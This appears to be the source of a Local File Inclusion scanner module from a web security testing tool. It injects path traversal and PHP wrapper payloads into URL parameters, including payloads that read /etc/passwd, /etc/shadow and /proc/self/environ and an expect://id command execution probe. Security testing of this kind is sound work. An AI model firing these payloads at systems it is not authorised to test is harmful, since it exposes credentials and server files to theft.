"""
LFIScanner — Local File Inclusion detection via path traversal payloads.

Lifecycle:
  DETECTED:   (not applicable — requires signature match)
  VALIDATED:  File content signature found in response
  EXPLOITABLE: (not applicable)
  VERIFIED:   (not applicable)

Maturity: Level 3 (Detect + Validate + typed evidence + reproduction)
"""

from urllib.parse import urlparse, parse_qs

from modules.utils import (
    safe_get, finding, log, Colors, _build_curl,
    VerificationStage,
    safe_cookies_dict,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult
import base64
import re
from models.finding import Finding
from models.evidence import HttpRequestEvidence, ResponseExcerptEvidence

LFI_SIGNATURES = [
    "root:x:0:0", "[extensions]", "[boot loader]",
    "for 16-bit app support", "daemon:x:",
]


class LFIScanner(ScannerBase):
    SCANNER_NAME = "lfi"
    SCANNER_MATURITY = 3
    TARGET_LEVEL = False

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._payloads = None

    def _get_payloads(self) -> list[str]:
        if self._payloads is None:
            loaded = self._load_payloads("lfi")
            if loaded and isinstance(loaded, list):
                self._payloads = loaded
            else:
                self._payloads = [
                    # Path traversal (Unix)
                    "../../../../etc/passwd",
                    "../../../../etc/shadow",
                    "../../../../etc/hosts",
                    "../../../../etc/issue",
                    "../../../../proc/self/environ",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252F..%252F..%252Fetc%252Fpasswd",
                    "/etc/passwd",
                    # Path traversal (Windows)
                    "../../../../windows/win.ini",
                    "../../../../windows/system.ini",
                    "../../../../boot.ini",
                    "C:\\Windows\\win.ini",
                    # PHP wrappers (no allow_url_include required)
                    "php://filter/convert.base64-encode/resource=etc/passwd",
                    "php://filter/read=convert.base64-encode/resource=etc/passwd",
                    "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
                    "php://filter/zlib.deflate/convert.base64-encode/resource=../../../../etc/passwd",
                    # PHP wrappers (require allow_url_include)
                    "php://input",
                    "expect://id",
                    # File scheme wrapper
                    "file:///etc/passwd",
                    # ZIP wrapper
                    "zip://test.zip%23test.php",
                ]
        return self._payloads

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        from urllib.parse import urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def detect(self, url: str, parameter: str) -> DetectionResult | None:
        payloads = self._get_payloads()
        baseline_resp = safe_get(self.session, url, self.timeout)
        if baseline_resp is None:
            return None
        baseline_body = baseline_resp.text or ""
        for payload in payloads:
            try:
                test_url = self._inject_param(url, parameter, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if resp:
                    body = resp.text
                    if not body:
                        continue
                    # Check standard LFI signatures
                    for sig in LFI_SIGNATURES:
                        if sig in body and sig not in baseline_body:
                            return DetectionResult(
                                url=test_url,
                                parameter=parameter,
                                payload=payload,
                                context=f"LFI signature: {sig!r}",
                                raw_response=resp,
                                evidence_signals=[f"LFI: {sig}"],
                            )
                    # Check for PHP wrapper (php://filter) — detect base64-encoded file content
                    if "php://filter" in payload and len(body) > 20:
                        # Attempt to find and decode base64 chunks in the response
                        b64_candidates = re.findall(r'[A-Za-z0-9+/]{40,}={0,2}', body)
                        for candidate in b64_candidates:
                            try:
                                decoded = base64.b64decode(candidate).decode("utf-8", errors="replace")
                                # Check if decoded content contains file signatures
                                for sig in LFI_SIGNATURES:
                                    if sig in decoded and sig not in baseline_body:
                                        return DetectionResult(
                                            url=test_url,
                                            parameter=parameter,
                                            payload=payload,
                                            context=f"PHP wrapper LFI: {sig!r} (via base64)",
                                            raw_response=resp,
                                            evidence_signals=[f"LFI: {sig} via php://filter"],
                                        )
                                # If decoded looks like a file (has newlines, colons, etc.)
                                if any(c in decoded for c in (":", "/", "\\")) and len(decoded) > 50:
                                    return DetectionResult(
                                        url=test_url,
                                        parameter=parameter,
                                        payload=payload,
                                        context="PHP wrapper LFI: file content via base64 decode",
                                        raw_response=resp,
                                        evidence_signals=["LFI: php://filter base64 decode"],
                                    )
                            except Exception:
                                continue
                    # Check for expect:// wrapper — look for command output
                    if "expect://" in payload and len(body) > 10 and body != baseline_body:
                        return DetectionResult(
                            url=test_url,
                            parameter=parameter,
                            payload=payload,
                            context="PHP wrapper LFI: expect:// execution",
                            raw_response=resp,
                            evidence_signals=["LFI: expect:// wrapper"],
                        )
            except Exception:
                continue
        return None

    @staticmethod
    def _context_excerpt(body: str, sigs: list[str], context_len: int = 100) -> str:
        """Return a context-aware excerpt around the first matching signature.

        Extracts *context_len* characters before the match, the match itself
        (with highlighting), and *context_len* characters after.
        Falls back to the first *context_len* characters when no signature
        is present in the body.
        """
        if not body:
            return ""
        best_pos = None
        best_sig = None
        for sig in sigs:
            pos = body.find(sig)
            if pos != -1:
                if best_pos is None or pos < best_pos:
                    best_pos = pos
                    best_sig = sig
        if best_pos is None or not best_sig:
            return body[:context_len * 2]
        start = max(0, best_pos - context_len)
        end = min(len(body), best_pos + len(best_sig) + context_len)
        before = body[start:best_pos]
        match = body[best_pos:best_pos + len(best_sig)]
        after = body[best_pos + len(best_sig):end]
        return f"{before}[LFI_MATCH]{match}[/LFI_MATCH]{after}"

    @staticmethod
    def _verify_file_content(body: str, sigs: list[str]) -> dict:
        """Verify response contains genuine file content, not just a signature reflex."""
        result = {"valid": False, "excerpt": "", "context": "unknown"}
        if not body:
            return result
        result["excerpt"] = LFIScanner._context_excerpt(body, sigs)
        lines = [l for l in body.split("\n") if l.strip()]
        line_count = len(lines)
        avg_line_len = sum(len(l) for l in lines) / max(line_count, 1)

        found_lines = []
        for sig in sigs:
            for line in lines:
                if sig in line:
                    found_lines.append(line.strip()[:120])
                    break

        result["found_lines"] = found_lines
        if "/etc/passwd" in sigs or "root:x:" in body:
            result["context"] = "unix_passwd"
            result["valid"] = ":" in body[:500] and line_count > 5
        elif "[extensions]" in body or "[boot loader]" in body:
            result["context"] = "windows_ini"
            result["valid"] = "[" in body and ("=" in body or line_count > 3)
        elif line_count > 10 and avg_line_len > 20:
            result["context"] = "structured_file"
            result["valid"] = True
        elif sigs and found_lines:
            result["context"] = "signature_match"
            result["valid"] = True
        return result

    def validate(self, detection: DetectionResult) -> ValidationResult | None:
        resp = detection.raw_response
        if not resp:
            return None
        body = resp.text or ""
        sigs_found = [sig for sig in LFI_SIGNATURES if sig in body]
        content_info = self._verify_file_content(body, sigs_found)
        count = len(sigs_found)
        detail_parts = []
        if content_info.get("context"):
            detail_parts.append(f"context={content_info['context']}")
        detail_parts.append(f"excerpt={content_info['excerpt'][:100]}")
        detail = " | ".join(detail_parts)

        if count >= 2 and content_info.get("valid"):
            return ValidationResult(
                confirmed=True,
                signals=sigs_found + ([content_info["context"]] if content_info["context"] != "unknown" else []),
                method="multi_sig",
                detail=f"LFI confirmed: {count} file signature(s) in response. {detail}",
            )
        if count == 1:
            extra_payloads = [
                "../../../../etc/shadow",
                "../../../../windows/system.ini",
            ]
            extras_hit = 0
            for alt in extra_payloads:
                alt_url = self._inject_param(detection.url, detection.parameter, alt)
                ar = safe_get(self.session, alt_url, self.timeout)
                if ar and any(s in (ar.text or "") for s in LFI_SIGNATURES):
                    extras_hit += 1
            if extras_hit >= 1:
                return ValidationResult(
                    confirmed=True,
                    signals=sigs_found + [f"alt_payload_x{extras_hit}"],
                    method="cross_payload",
                    detail=f"LFI confirmed via {extras_hit} alternate payload(s). {detail}",
                )
            return ValidationResult(
                confirmed=False,
                signals=sigs_found,
                method="single_sig",
                detail=f"Single file signature found; cross-payload check inconclusive. {detail}",
            )
        return ValidationResult(
            confirmed=False,
            method="no_sig",
            detail=f"No known file signatures in response. {detail}",
        )

    def generate_reproduction(self, detection: DetectionResult) -> list[str]:
        return [
            f"curl -X GET '{detection.url}&{detection.parameter}={detection.payload}'",
            f"Observe file signature in response: {detection.context} — the server returns the contents of the requested file",
            "An attacker can read arbitrary server files (source code, configs, SSH keys, databases), leading to full application compromise and lateral movement",
        ]

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        raw_urls = self.recon.get("urls", []) if target_urls is None else target_urls
        for url in raw_urls:
            if "?" not in url or not self._in_scope(url):
                continue
            try:
                params = list(parse_qs(urlparse(url).query).keys())
                for param in params:
                    detection = self.detect(url, param)
                    if detection is None:
                        continue
                    req_ev = HttpRequestEvidence(
                        method="GET",
                        url=detection.url,
                        curl_command=_build_curl("GET", detection.url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                    )
                    resp = detection.raw_response
                    resp_ev = ResponseExcerptEvidence(
                        excerpt=resp.text[:500] if resp else "",
                        length=len(resp.text) if resp else 0,
                        context="lfi_detection",
                    )
                    f = finding(
                        vuln_type="Local File Inclusion",
                        url=detection.url,
                        severity="critical",
                        details=f"Parameter '{detection.parameter}' includes local file (signature: {detection.context})",
                        evidence=f"Payload: {detection.payload}",
                        request=_build_curl("GET", detection.url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=resp.text[:500] if resp else "",
                        parameter=detection.parameter,
                        steps_to_reproduce=self.generate_reproduction(detection),
                        verification_stage=VerificationStage.VALIDATED.value,
                    )
                    if f:
                        validation_result = self.validate(detection)
                        if validation_result and validation_result.confirmed:
                            f["verification_stage"] = VerificationStage.VALIDATED.value
                        else:
                            f["verification_stage"] = VerificationStage.DETECTED.value
                        self.evidence_engine.store(req_ev)
                        self.evidence_engine.store(resp_ev)
                        self.evidence_engine.link_to_finding(req_ev, f.get("fingerprint", ""))
                        self.evidence_engine.link_to_finding(resp_ev, f.get("fingerprint", ""))
                        self._enrich_finding(f, 2, f["verification_stage"])
                        self._add_finding(f)
                    log(f"  [LFI] {detection.url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return self._get_findings()
